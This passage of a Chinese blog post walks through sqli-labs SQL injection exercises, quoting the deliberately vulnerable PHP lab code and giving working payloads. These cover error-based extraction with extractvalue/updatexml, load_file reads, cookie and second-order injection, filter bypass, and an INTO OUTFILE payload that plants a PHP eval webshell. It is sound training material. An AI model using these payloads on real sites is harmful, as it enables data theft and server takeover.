this_dump_name = <span class="string">""</span>.join(dump_name)</span><br><span class="line">    <span class="keyword">print</span> this_dump_name</span><br></pre></td></tr></table></figure></p>
<p>这是我整个注入的过程，有不好的地方，代码还会再进行修改。</p>
<p>第六题和第五题一样，只要对payload稍作修改就好。</p>
<h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a><strong>0x04</strong></h2><p>报错注入：<br>知识点链接:<br>(<a href="https://blog.csdn.net/zpy1998zpy/article/details/80631036)[https://blog.csdn.net/zpy1998zpy/article/details/80631036]" target="_blank" rel="noopener">https://blog.csdn.net/zpy1998zpy/article/details/80631036)[https://blog.csdn.net/zpy1998zpy/article/details/80631036]</a><br>这里我们要学习一下<br>基于extractvalue()和updatexml()的报错注入<br>具体内容看上面的链接,反正都是从别人那儿搬来的知识点,我就不重复了.</p>
<p>extractvalue(): 对XML文档进行查询的函数<br>语法：extractvalue(目标xml文档，xml路径)<br>第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username from security.user where id=<span class="number">1</span> <span class="keyword">and</span> (extractvalue(‘anything’,concat(‘~’,(select database()))))</span><br></pre></td></tr></table></figure></p>
<p>updatexml():<br>updatexml()函数与extractvalue()类似，是更新xml文档的函数。<br>关于updatexml()的知识点:<a href="http://www.cnblogs.com/AmoBlogs/p/8673748.html" target="_blank" rel="noopener">http://www.cnblogs.com/AmoBlogs/p/8673748.html</a><br>语法updatexml(目标xml文档，xml路径，更新的内容)<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username from security.user where id=<span class="number">1</span> <span class="keyword">and</span> (updatexml(‘anything’,’/xx/xx’,’anything’))</span><br></pre></td></tr></table></figure></p>
<h1 id="sqli-lab-7"><a href="#sqli-lab-7" class="headerlink" title="sqli-lab 7"></a>sqli-lab 7</h1><p>知识点：mysql关于文件操作(文件的读/写)：</p>
<h2 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h2><p>通过load_file函数将文件内容爆出来，使用load_file函数的前提是：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>当前权限对该文件可读</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>文件在该服务器上</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>路径完整</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>文件大小小于max_allowed_packet</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>当前数据库用户有FILE权限</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span>secure_file_priv的值为空，如果值为某目录，那么就只能对该目录的文件进行操作</span><br></pre></td></tr></table></figure></p>
<p>例子：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select load_file(<span class="string">'D:\xampp\htdocs\www\wanju\htaccess.txt'</span>)</span><br><span class="line"></span><br><span class="line">select load_file(<span class="string">'/etc/hosts'</span>)</span><br></pre></td></tr></table></figure></p>
<p>所以我在这附近的一篇博客中写道关于Mysql注入loadfile常见路径，目的就是为了能够获取到服务器的一些相关信息。</p>
<h2 id="select-…-into-outfile"><a href="#select-…-into-outfile" class="headerlink" title="select … into outfile"></a>select … into outfile</h2><p>使用此语句，我们可以将select内容导入文件<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)目标目录要有可写权限</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)当前数据库用户要有FILE权限</span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>)目标文件不能已存在</span><br><span class="line"></span><br><span class="line">(<span class="number">4</span>)secure_file_priv的值为空</span><br><span class="line"></span><br><span class="line">(<span class="number">5</span>)路径完整</span><br></pre></td></tr></table></figure></p>
<p>这里一般可以想到常见的使用一句话木马来连接对方的服务器。</p>
<p>观察源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($row)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'You are in.... Use outfile......'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'You have an error in your SQL syntax'</span>;</span><br><span class="line">    <span class="comment">//print_r(mysql_error());</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>如果我们注入正确将会返回，’You are in…. Use outfile……’，<br>payload中如果想要导入一句话木马的话<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">')) UNION SELECT 1,2,'</span><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_post[<span class="string">"c"</span>])<span class="meta">?&gt;</span><span class="string">' into outfile "C:\\phpStudy\\PHPTutorial\\WWW\\sqlilabs\\Less-7\\test.php"--+</span></span><br></pre></td></tr></table></figure></p>
<h1 id="sqli-lab-17"><a href="#sqli-lab-17" class="headerlink" title="sqli-lab 17"></a>sqli-lab 17</h1><p>这道题，首先看到修改密码，那么要想起mysql中修改数据的语句<br>基本语法如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE user SET password = <span class="string">'passwd'</span> WHERE user = <span class="string">'username'</span></span><br></pre></td></tr></table></figure></p>
<p>查看源码可知：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username= $uname LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="comment">//echo $row;</span></span><br><span class="line">    <span class="keyword">if</span>($row)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//echo '&lt;font color= "#0000ff"&gt;';   </span></span><br><span class="line">        $row1 = $row[<span class="string">'username'</span>];   </span><br><span class="line">        <span class="comment">//echo 'Your Login name:'. $row1;</span></span><br><span class="line">        $update=<span class="string">"UPDATE users SET password = '$passwd' WHERE username='$row1'"</span>;</span><br><span class="line">        mysql_query($update);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br></pre></td></tr></table></figure></p>
<p>所以payload的构造中，我们要构造使得passwd闭合，然后username就随意吧。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;passwd=<span class="number">-1</span><span class="string">'and extractvalue(1,concat(0x7e,(select database()),0x7e))#&amp;Submit=submit</span></span><br></pre></td></tr></table></figure></p>
<h1 id="sqlilab-20"><a href="#sqlilab-20" class="headerlink" title="sqlilab-20"></a>sqlilab-20</h1><p>我觉得这道题，实际上是一个cookie注入(个人这么认为)<br>一个cookie注入的实现有两点：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">条件<span class="number">1</span>是：</span><br><span class="line"></span><br><span class="line">程序对get和post方式提交的数据进行了过滤，但未对cookie提交的数据库进行过滤</span><br><span class="line"></span><br><span class="line">条件<span class="number">2</span>是：在条件<span class="number">1</span>的基础上还需要程序对提交数据获取方式是直接request(<span class="string">"xxx"</span>)的方式，未指明使用request对象的具体方法进行获取，也就是说用request这个方法的时候获取的参数可以是是在URL后面的参数也可以是cookie里面的参数这里没有做筛选，之后的原理就像我们的sql注入一样了</span><br></pre></td></tr></table></figure></p>
<p>所以这里就要说到HTTP中cookie的工作过程了，当我们的浏览器带着认证信息，发出HTTP请求后，服务器将会对认证信息进行确认，然后，返回HTTP响应，并且在浏览器中种下cookie，浏览器下次发送HTTP请求时就会带上这个cookie,然后服务器再一次解析cookie,推送相应内容。</p>
<p>所以这次的sql注入点之所以在cookie,就是由于未对cookie进行过滤，所以使得注入有机可乘。</p>
<p>看关键源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">    </span><br><span class="line">        $uname = check_input($_POST[<span class="string">'uname'</span>]);</span><br><span class="line">        $passwd = check_input($_POST[<span class="string">'passwd'</span>]);</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        $sql=<span class="string">"SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1"</span>;</span><br><span class="line">        $result1 = mysql_query($sql);</span><br><span class="line">        $row1 = mysql_fetch_array($result1);</span><br><span class="line">        $cookee = $row1[<span class="string">'username'</span>];</span><br><span class="line">            <span class="keyword">if</span>($row1)</span><br><span class="line">                &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00" font size = 3 &gt;'</span>;</span><br><span class="line">                setcookie(<span class="string">'uname'</span>, $cookee, time()+<span class="number">3600</span>);   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            </span><br><span class="line">            $cookee = $_COOKIE[<span class="string">'uname'</span>];<span class="comment">//最关键的代码</span></span><br><span class="line">            $format = <span class="string">'D d M Y - H:i:s'</span>;</span><br><span class="line">            $timestamp = time() + <span class="number">3600</span>;    </span><br><span class="line">            </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;/font&gt;"</span>;</span><br><span class="line">            $sql=<span class="string">"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1"</span>;<span class="comment">//最关键的代码</span></span><br><span class="line">            $result=mysql_query($sql);</span><br><span class="line">            <span class="keyword">if</span> (!$result)</span><br><span class="line">                &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'Issue with your mysql: '</span> . mysql_error());</span><br><span class="line">                &#125;</span><br><span class="line">            $row = mysql_fetch_array($result);</span><br><span class="line">            <span class="keyword">if</span>($row)</span><br></pre></td></tr></table></figure></p>
<p>第一次成功登录后服务器将会在浏览器种下cookie<br><img src="/2019/01/28/巩固sql注入/17.png" alt=""></p>
<p>下一次刷新后，也就是再一次发起HTTP请求，此时将会带上cookie<br><img src="/2019/01/28/巩固sql注入/18.png" alt=""></p>
<p>那我们修改cookie,就能进行注入<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin1<span class="string">'and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#</span></span><br></pre></td></tr></table></figure></p>
<p>现在总算觉得对这道题有所理解，我之前都在干啥啊</p>
<h1 id="sqlilab-23"><a href="#sqlilab-23" class="headerlink" title="sqlilab-23"></a>sqlilab-23</h1><p>这道题中，观察源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//filter the comments out so as to comments should not work</span></span><br><span class="line">$reg = <span class="string">"/#/"</span>;</span><br><span class="line">$reg1 = <span class="string">"/--/"</span>;</span><br><span class="line">$replace = <span class="string">""</span>;</span><br><span class="line">$id = preg_replace($reg, $replace, $id);</span><br><span class="line">$id = preg_replace($reg1, $replace, $id);</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure></p>
<p>可以见到在这道题中’#’和’–’已经被过滤掉了，而其中的sql语句又为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure></p>
<p>此处的payload为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">' union select 1,database(),'</span><span class="number">3</span></span><br></pre></td></tr></table></figure></p>
<p>实际上这条语句为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=<span class="string">'-1'</span> union select <span class="number">1</span>,database(),<span class="string">'3'</span> limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<p>与之前的注释性闭合不同的是，这里我们构造新的闭合，在sql注入中有一点我觉得需要注意的就是sql语句的完整性。</p>
<p>同样可以使用报错注入,构造payload：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">' or extractvalue(1,concat(0x7e,(select group_concat(column_name) from  information_schema.columns where table_schema='</span>security<span class="string">' and table_name='</span>users<span class="string">'),0x7e)) or '</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<h1 id="sqlilab-24"><a href="#sqlilab-24" class="headerlink" title="sqlilab-24"></a>sqlilab-24</h1><p>参考文章:<a href="https://www.freebuf.com/articles/web/167089.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/167089.html</a><br>参考文章:<a href="http://www.w3school.com.cn/php/func_mysql_real_escape_string.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/php/func_mysql_real_escape_string.asp</a><br>这道题是关于二次注入,这道注入题，先来分析源码，建议把这道题的目录下的所有代码都看一遍，知道这道题是如何运作的<br>先是new_user.php,这段代码，可以看出，我们提交三个值分别为：username,password,re_password<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">"username"</span> id=<span class="string">"username"</span> type=<span class="string">"text"</span> value=<span class="string">""</span> /&gt; </span><br><span class="line"></span><br><span class="line">&lt;input name=<span class="string">"password"</span> id=<span class="string">"password"</span> type=<span class="string">"password"</span> value=<span class="string">""</span> /&gt;</span><br><span class="line"></span><br><span class="line">&lt;input name=<span class="string">"re_password"</span> id=<span class="string">"re_password"</span> type=<span class="string">"password"</span> value=<span class="string">""</span> /&gt;</span><br></pre></td></tr></table></figure></p>
<p>接着是login_create.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment"># Validating the user input........</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//$username=  $_POST['username'] ;</span></span><br><span class="line">    $username=  mysql_escape_string($_POST[<span class="string">'username'</span>]) ;</span><br><span class="line">    $pass= mysql_escape_string($_POST[<span class="string">'password'</span>]);</span><br><span class="line">    $re_pass= mysql_escape_string($_POST[<span class="string">'re_password'</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;font size='3' color='#FFFF00'&gt;"</span>;</span><br><span class="line">    $sql = <span class="string">"select count(*) from users where username='$username'"</span>;</span><br><span class="line">    $res = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'You tried to be smart, Try harder!!!! :( '</span>);</span><br><span class="line">    $row = mysql_fetch_row($res);</span><br></pre></td></tr></table></figure></p>
<p>这段代码中有两个点，我觉得是需要注意的，<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql_escape_string()函数</span><br><span class="line">(php&lt;<span class="number">5.4</span>)</span><br><span class="line">用于对sql中的特殊字符进行转义，特殊字符包括：</span><br><span class="line"></span><br><span class="line">\x00</span><br><span class="line">\n</span><br><span class="line">\r</span><br><span class="line">\</span><br><span class="line"><span class="string">'</span></span><br><span class="line"><span class="string">"</span></span><br><span class="line"><span class="string">\x1a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">本函数和 mysql_real_escape_string() 完全一样，</span></span><br><span class="line"><span class="string">除了 mysql_real_escape_string() 接受的是一个连接句柄并根据当前字符集转移字符串之外。mysql_escape_string() 并不接受连接参数，也不管当前字符集设定。</span></span><br></pre></td></tr></table></figure></p>
<p>用一个例子来进行说明<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> $str = <span class="string">"SELECT * FROM users where id = 1' or '1'='1"</span>;</span><br><span class="line"> <span class="keyword">echo</span> mysql_escape_string($str);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>返回的内容<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users where id = <span class="number">1</span>\<span class="string">' or \'1\'=\'1</span></span><br></pre></td></tr></table></figure></p>
<p>另一个点<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"select count(*) from users where username='$username'"</span>;</span><br></pre></td></tr></table></figure></p>
<p>关键代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($pass==$re_pass)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment"># Building up the query........</span></span><br><span class="line">                </span><br><span class="line">                $sql = <span class="string">"insert into users ( username, password) values(\"$username\", \"$pass\")"</span>;</span><br><span class="line">                mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'Error Creating your user account,  : '</span>.mysql_error());</span><br></pre></td></tr></table></figure></p>
<p>创建新的用户，然后这里有一个问题就是当我们输入问题用户为： admin’# 时，在数据库中查看发现并没有被转义啊，数据进入数据库后，将会被再次还原。<br><img src="/2019/01/28/巩固sql注入/19.png" alt=""></p>
<p>当我们创建新的用户后，登录后，修改密码，查看源码pass_change.php,<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' "</span>;</span><br></pre></td></tr></table></figure></p>
<p>当我们创建一个新用户 admin’# ,登录后，去修改其密码，那么sql语句就会为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE user SET PASSWO=<span class="string">'cookie'</span> where username = <span class="string">'admin'</span><span class="comment">#' and password = 'test';</span></span><br></pre></td></tr></table></figure></p>
<p>二次注入由此完成</p>
<h1 id="sqlilab-25"><a href="#sqlilab-25" class="headerlink" title="sqlilab-25"></a>sqlilab-25</h1><p>关键代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);         <span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">    $id= preg_replace(<span class="string">'/AND/i'</span>,<span class="string">""</span>, $id);        <span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里可见or还有and被过滤掉了。</p>
<p>所以在在这里我们使用<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">|| 代替 <span class="keyword">or</span></span><br><span class="line">&amp;&amp; 代替 <span class="keyword">and</span></span><br></pre></td></tr></table></figure></p>
<p>所以这道题的payload为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span><span class="string">'|| extractvalue(1,concat(0x7e,(select database()))) || '</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<h1 id="sqlilab-25a"><a href="#sqlilab-25a" class="headerlink" title="sqlilab-25a"></a>sqlilab-25a</h1><p>此题观察源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure></p>
<p>没有报错项，且未有单引号掣肘。</p>
<p>所以同25题一样。<br>payload:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-25a/?id=-1%20UNION%20select%201,version(),3 || 1=1</span><br></pre></td></tr></table></figure></p>
<h1 id="sqlilab-32"><a href="#sqlilab-32" class="headerlink" title="sqlilab-32"></a>sqlilab-32</h1><p>这里讲的是宽字节注入，先看看关键代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string = preg_replace(<span class="string">'/'</span>. preg_quote(<span class="string">'\\'</span>) .<span class="string">'/'</span>, <span class="string">"\\\\\\"</span>, $string);          <span class="comment">//escape any backslash</span></span><br><span class="line">    $string = preg_replace(<span class="string">'/\'/i'</span>, <span class="string">'\\\''</span>, $string);                               <span class="comment">//escape single quote with a backslash</span></span><br><span class="line">    $string = preg_replace(<span class="string">'/\"/'</span>, <span class="string">"\\\""</span>, $string);                                <span class="comment">//escape double quote with a backslash</span></span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables </span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=check_addslashes($_GET[<span class="string">'id'</span>]);</span><br><span class="line"><span class="comment">//echo "The filtered request is :" .$id . "&lt;br&gt;";</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line"></span><br><span class="line">mysql_query(<span class="string">"SET NAMES gbk"</span>);</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure></p>
